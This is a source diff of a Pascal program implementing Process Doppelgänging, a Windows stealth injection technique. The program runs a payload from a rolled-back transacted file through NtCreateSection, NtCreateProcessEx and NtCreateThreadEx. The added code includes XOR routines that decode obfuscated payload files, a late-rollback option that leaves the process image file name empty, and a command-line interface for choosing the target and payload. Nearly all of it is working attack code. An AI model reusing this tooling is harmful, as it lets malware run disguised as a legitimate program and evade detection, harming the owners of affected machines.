@@ -1,6 +1,11 @@
+//this is https://github.com/3gstudent/Inject-dll-by-Process-Doppelganging
+//or https://github.com/hasherezade/process_doppelganging
+//or https://gist.github.com/hfiref0x/a9911a0b70b473281c9da5daea9a177f
+//also see https://github.com/jxy-s/herpaderping
+
 program NtCreateThread;
 
-uses windows,sysutils, ntdll;
+uses windows,sysutils, ntdll ;
 
 var
 dummy:dword;
@@ -21,8 +26,19 @@ dummy:dword;
    ): THANDLE; stdcall; stdcall; external 'kernel32.dll';
 
    function GetProcessId(Process: THandle): DWORD; stdcall; external 'kernel32.dll' name 'GetProcessId';
+   function GetThreadId(Process: THandle): DWORD; stdcall; external 'kernel32.dll' name 'GetThreadId';
+
+   function CreateEnvironmentBlock(
+             lpEnvironment:ppvoid;
+    hToken:HANDLE;
+              bInherit:BOOL):BOOL; stdcall; external 'userenv.dll' ;
 
    //function ImageNtHeader(Base: Pointer): PIMAGE_NT_HEADERS; stdcall; external 'dbghelp.dll';
+
+   procedure log(msg:string);
+   begin
+   writeln(msg);
+   end;
 
    procedure InitializeObjectAttributes(var p: TObjectAttributes; n:PUNICODE_STRING;
                                              a: ULONG; r: THandle; s: PVOID);
@@ -35,7 +51,85 @@ dummy:dword;
      p.SecurityQualityOfService := nil;
    end;
 
-   procedure main(targetapp,payload:widestring);
+   function xorfileV3(filein:string;var bufferOut:pointer):dword;
+   var
+     dwread:dword=0;
+     c:dword;
+     dwFileSize:dword;
+     hfilein:thandle;
+     pOut:^byte;
+     key:array[0..2] of word=($400,$1000,$4000);
+     label fin;
+   begin
+     //log('********* xorfile **************');
+     hFilein := CreateFile(pchar(filein),GENERIC_READ,0,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
+     if hFilein=thandle(-1) then exit;
+     //
+     dwFileSize := GetFileSize(hFilein,nil);
+     log('dwFileSize:'+inttostr(dwFileSize));
+     if dwFileSize = INVALID_FILE_SIZE then exit;
+
+     bufferOut := AllocMem(dwFileSize);
+
+     ReadFile(hFilein,bufferOut^,dwFileSize,dwRead,nil);
+     if (dwread=0) or (dwread<>dwFileSize) then goto fin;
+     //xor buffer here
+     pOut:=bufferOut;
+     for c:=0 to dwread -1 do
+       begin
+       pOut^ := pOut^ xor (Key[2] shr 8);
+       Key[2] := byte(pOut^ + Key[2]) * Key[0] + Key[1];
+       inc(pOut);
+       end;
+     //
+     result:=dwFileSize ;
+
+     //
+     fin:
+     closehandle(hFilein);
+     log('XOR OK');
+   end;
+
+   function xorfile(filein:string;var buffer:pointer):dword;
+var
+  dwread:dword=0;
+  dwwrite:dword=0;
+  c:dword;
+  dwFileSize:dword;
+  hfilein,hfileout:thandle;
+  //buffer:pointer;
+  ptr:pbyte;
+  label fin;
+begin
+  //log('********* xorfile **************');
+  hFilein := CreateFile(pchar(filein),GENERIC_READ,0,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
+  if hFilein=thandle(-1) then exit;
+  //
+  dwFileSize := GetFileSize(hFilein,nil);
+  log('dwFileSize:'+inttostr(dwFileSize));
+  if dwFileSize = INVALID_FILE_SIZE then exit;
+
+  buffer := AllocMem(dwFileSize);
+
+  ReadFile(hFilein,buffer^,dwFileSize,dwRead,nil);
+  if (dwread=0) or (dwread<>dwFileSize) then goto fin;
+  //xor buffer here
+  ptr:=buffer;
+  for c:=0 to dwread -1 do
+    begin
+    ptr^:=ptr^ xor 255;
+    inc(ptr);
+    end;
+  //
+  result:=dwFileSize ;
+
+  //
+  fin:
+  closehandle(hFilein);
+  log('XOR OK');
+end;
+
+   procedure main(targetapp,payload:widestring;late_rollback:boolean=false);
    var
       targetHandle :thandle=thandle(-1);
    hprocess :thandle=thandle(-1);
@@ -60,11 +154,12 @@ dummy:dword;
      EntryPoint:nativeuint;
      ntheaders:PIMAGE_NT_HEADERS;
      ImageBaseAddress:nativeuint;
-     ustr:UNICODE_STRING ;
+     ustr,udir:UNICODE_STRING ;
      ProcessParameters:PRTL_USER_PROCESS_PARAMETERS=nil;
      MemoryPtr:pvoid=nil;
      peb_:PPEB;
      n:NativeUInt ;
+     environment:pvoid;
    begin
      {
      //test local peb
@@ -109,6 +204,8 @@ dummy:dword;
      }
      //***************** lets read the payload
      writeln('****************');
+     if (lowercase(ExtractFileExt (payload))<>'.xor') and (lowercase(ExtractFileExt (payload))<>'.encrypted') then
+     begin
      outFile := CreateFilew(pwidechar(payload), GENERIC_READ, 0, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL , 0);
      if outFile=thandle(-1) then exit;
      bytesread:=GetFileSize(outfile,nil) ;
@@ -118,8 +215,10 @@ dummy:dword;
      if readfile(outfile,buffer^,bytesread,bytesread,nil)=false then writeln('readfile false');
      writeln('bytesread='+inttostr(bytesread));
      CloseHandle(outfile);
-
      ScectionDataSize  :=bytesread;
+     end
+     else
+     ScectionDataSize:=xorfilev3(payload,buffer);
 
 
      {
@@ -132,6 +231,7 @@ dummy:dword;
      if status<>0 then exit;
      }
 
+
      //************** lets create a transacted file
      writeln('****************');
      InitializeObjectAttributes(Attrib ,nil,0,0,nil);
@@ -142,10 +242,13 @@ dummy:dword;
 
      writeln('targetapp:'+(targetapp));
      //we could use DWORD size = GetTempPathW(MAX_PATH, temp_path);  GetTempFileNameW(temp_path, L"TH", 0, dummy_name);
-     hTransactedFile:=CreateFileTransactedw(pwidechar(targetapp), GENERIC_WRITE or GENERIC_READ,0,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0,hTransaction,nil,nil);
+     //create_always if you want to use a non existing file
+     if FileExists(targetapp)
+        then hTransactedFile:=CreateFileTransactedw(pwidechar(targetapp), GENERIC_WRITE or GENERIC_READ,0,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0,hTransaction,nil,nil)
+        else hTransactedFile:=CreateFileTransactedw(pwidechar(targetapp), GENERIC_WRITE or GENERIC_READ,0,nil,CREATE_ALWAYS ,FILE_ATTRIBUTE_NORMAL,0,hTransaction,nil,nil);
      if hTransactedFile =thandle(-1) then
                  begin
-                 writeln('hTransactedFile=invalid handle');
+                 writeln('hTransactedFile=invalid handle,'+inttostr(getlasterror));
                  exit;
                  end;
 
@@ -156,24 +259,28 @@ dummy:dword;
                  end
                  else writeln('byteswritten:'+inttostr(byteswritten));
 
+
      //************* lets create a section against this transacted file
      writeln('****************');
+     //in a normal life we would pass the handle to the file rather than hTransactedFile
      status:=NtCreateSection(@SectionHandle,SECTION_ALL_ACCESS,nil,nil,PAGE_READONLY,SEC_IMAGE,hTransactedFile);
      //status:=NtCreateSection(@SectionHandle, $E, nil, @ScectionDataSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, nil );
      writeln('NtCreateSection:'+inttohex(status,sizeof(status)));
      if SectionHandle <=0 then exit;
      if status<>0 then exit;
 
+     //rolling back here will make it so that ProcessImageFileName will be messed up
+     if late_rollback=false then
+     begin
      status := NtRollbackTransaction(hTransaction, TRUE);
      writeln('NtRollbackTransaction:'+inttohex(status,sizeof(status)));
-
 
      CloseHandle(hTransactedFile);
      hTransactedFile := INVALID_HANDLE_VALUE;
 
      NtClose(hTransaction);
      hTransaction := 0;
-
+     end;
 
      {
      localSectionOffset.QuadPart :=0;
@@ -204,9 +311,17 @@ dummy:dword;
      //************** lets create the process from the section
      writeln('****************');
              ZeroMemory(@hprocess,sizeof(hprocess));
+             //
+             {
+             InitializeObjectAttributes(Attrib ,nil,0,0,nil);
+             RtlInitUnicodeString(@ustr , pwstr(targetapp ));
+             attrib.ObjectName :=@ustr;
+             attrib.Attributes := $00000002; //OBJ_INHERIT  00000040
+             }
+             //
              status := NtCreateProcessEx(@hProcess,
                  PROCESS_ALL_ACCESS,
-                 nil,
+                 nil, //@attrib
                  ntCurrentProcess,
                  PS_INHERIT_HANDLES,
                  SectionHandle,
@@ -215,9 +330,22 @@ dummy:dword;
                  FALSE);
 
              writeln('NtCreateProcessEx:'+inttohex(status,sizeof(status)));
-             //if status<>0 then exit;
+             if status<>0 then exit;
              writeln('pid:'+inttostr(GetProcessID(hProcess)));
 
+     //
+     if late_rollback=true then
+     begin
+     status := NtRollbackTransaction(hTransaction, TRUE);
+     writeln('NtRollbackTransaction:'+inttohex(status,sizeof(status)));
+
+     CloseHandle(hTransactedFile);
+     hTransactedFile := INVALID_HANDLE_VALUE;
+
+     NtClose(hTransaction);
+     hTransaction := 0;
+     end;
+     //
      //        https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55
      //        0xC0000024 STATUS_OBJECT_TYPE_MISMATCH
      //C0000049	STATUS_SECTION_NOT_IMAGE
@@ -247,39 +375,48 @@ dummy:dword;
 
       //writeln(inttohex(nativeuint(ntheaders),sizeof(pointer))) ;
       EntryPoint := ntheaders^.OptionalHeader.AddressOfEntryPoint;
+      writeln('EntryPoint:'+inttohex(EntryPoint,sizeof(EntryPoint)));
       EntryPoint := EntryPoint + ImageBaseAddress;
       writeln('EntryPoint:'+inttohex(EntryPoint,sizeof(EntryPoint)));
 
       //*********** Allocate memory in target process and write process parameters block.
+      //CreateEnvironmentBlock(@environment, 0, TRUE);
       writeln('****************');
-      RtlInitUnicodeString(@ustr, pwstr(targetapp ));
+      RtlInitUnicodeString(@ustr, pwstr(targetapp )); //whatever you want here
+      RtlInitUnicodeString(@udir, pwstr('c:\windows\system32' )); //whatever you want here
       writeln('targetapp:'+strpas(ustr.Buffer) );
       //zeromemory(ProcessParameters,sizeof(ProcessParameters));
         status := RtlCreateProcessParametersEx(@ProcessParameters,
-            @ustr,
+            @ustr, //image path name
+            @udir,
+            @udir,
+            @ustr, //command line
+            nil, //environment
             nil,
             nil,
-            @ustr,
             nil,
             nil,
-            nil,
-            nil,
-            nil,
-            RTL_USER_PROC_PARAMS_NORMALIZED);
+            {0} RTL_USER_PROC_PARAMS_NORMALIZED); //offset vs pointers
       writeln('RtlCreateProcessParametersEx:'+inttohex(status,sizeof(status)));
       writeln('ProcessParameters:'+inttohex(nativeuint(ProcessParameters),sizeof(nativeuint)));
-      writeln('CommandLine:'+strpas(ProcessParameters^.CommandLine.Buffer  ))  ;
+      try
+        writeln('CommandLine:'+strpas(ProcessParameters^.CommandLine.Buffer  ))  ;
+        writeln('ImagePathName:'+strpas(ProcessParameters^.ImagePathName.Buffer  ))  ;
+      except
+      end;
 
-      //numberofbytesread := align(ProcessParameters^.EnvironmentSize + ProcessParameters^.MaximumLength,$1000);
+      writeln('****************');
+
       numberofbytesread := ProcessParameters^.EnvironmentSize + ProcessParameters^.MaximumLength;
-      //numberofbytesread:=align(numberofbytesread,$1000);
+      numberofbytesread:=align(numberofbytesread,$1000);
       writeln('numberofbytesread:'+inttostr(numberofbytesread));
 
       MemoryPtr := ProcessParameters;
+      writeln('MemoryPtr:'+inttohex(nativeuint(MemoryPtr),sizeof(nativeuint)));
 
       status := NtAllocateVirtualMemory(hProcess,@MemoryPtr,0,@numberofbytesread,MEM_RESERVE or MEM_COMMIT,PAGE_READWRITE);
       writeln('NtAllocateVirtualMemory:'+inttohex(status,sizeof(status)));
-      writeln('MemoryPtr:'+inttohex(nativeuint(MemoryPtr),sizeof(nativeuint)));
+      writeln('ProcessParameters:'+inttohex(nativeuint(ProcessParameters),sizeof(nativeuint)));
       numberofbytesread := 0;
       status := NtWriteVirtualMemory(hProcess,ProcessParameters,ProcessParameters,ProcessParameters^.EnvironmentSize + ProcessParameters^.MaximumLength,@numberofbytesread );
       //or
@@ -288,13 +425,13 @@ dummy:dword;
       writeln('numberofbytesread:'+inttostr(numberofbytesread));
       //0x8000000D   STATUS_PARTIAL_COPY
 
+
       //************Update PEB->ProcessParameters pointer to newly allocated block.
 
       //Peb_ := pbi.PebBaseAddress;
       //writeln('Peb:'+inttohex(nativeuint(Peb),sizeof(pointer)));
-      n:=nativeuint(MemoryPtr );
+      n:=nativeuint(ProcessParameters );
       //n:=nativeuint(addr(MemoryPtr));
-      writeln('MemoryPtr:'+inttohex(nativeuint(MemoryPtr ),sizeof(n)));
       //writeln('MemoryPtr:'+inttohex(nativeuint(addr(MemoryPtr)),sizeof(n)));
       numberofbytesread := 0;
       //status:=NtWriteVirtualMemory(hProcess,pointer(nativeuint(pbi.PebBaseAddress)+$20),ProcessParameters,sizeof(PVOID),@numberofbytesread);
@@ -306,6 +443,16 @@ dummy:dword;
       //status:=NtReadVirtualMemory(hProcess, pointer(nativeuint(pbi.PebBaseAddress)+$20), @n, sizeof(pvoid), @numberofbytesread );
       //writeln('n:'+inttohex(nativeuint(n ),sizeof(n)));
       //
+      //
+      //status:= NtSetInformationProcess(hprocess,ProcessImageFileName,@ustr,sizeof(ustr));
+      //writeln('NtSetInformationProcess:'+inttohex(status,sizeof(status)));
+      //fails with 0xC0000003, STATUS_INVALID_INFO_CLASS
+      RtlInitUnicodeString(@ustr, pwstr(targetapp ));
+      status:=NtqueryInformationProcess(hprocess ,ProcessImageFileName ,@ustr,sizeof(ustr),@ReturnLength);
+      writeln('NtqueryInformationProcess:'+inttohex(status,sizeof(status))+' '+inttostr(ReturnLength));
+      writeln('ProcessImageFileName:'+strpas(ustr.Buffer) ); //will be empty :(
+      status:=RtlDestroyProcessParameters(ProcessParameters);
+      writeln('RtlDestroyProcessParameters:'+inttohex(status,sizeof(status)));
       //readln;
       writeln('****************');
       RemoteThread := 0;
@@ -321,19 +468,22 @@ dummy:dword;
             nil,
             nil);
         writeln('NtCreateThreadEx:'+inttohex(status,sizeof(status)));
+        writeln('RemoteThread:'+inttostr(GetThreadId(RemoteThread)));
       //
 
      //NtClose( targetHandle );
-     //NtClose( SectionHandle );
+     NtClose( SectionHandle );
      //NtClose( remoteSectionAddress );
      //NtClose( localSectionAddress );
      //NtClose( RemoteThread );
+     //readln;
    end;
 
 begin
-
-
-  main('c:\temp\PsExec64.exe','c:\_apps\putty.exe');
+  writeln('Process-Doppelganging');
+  writeln('ntcreatethreadex.exe targetapp payload');
+  if paramcount<>2 then exit;
+  main(paramstr(1),paramstr(2),false);
 
 end.
 
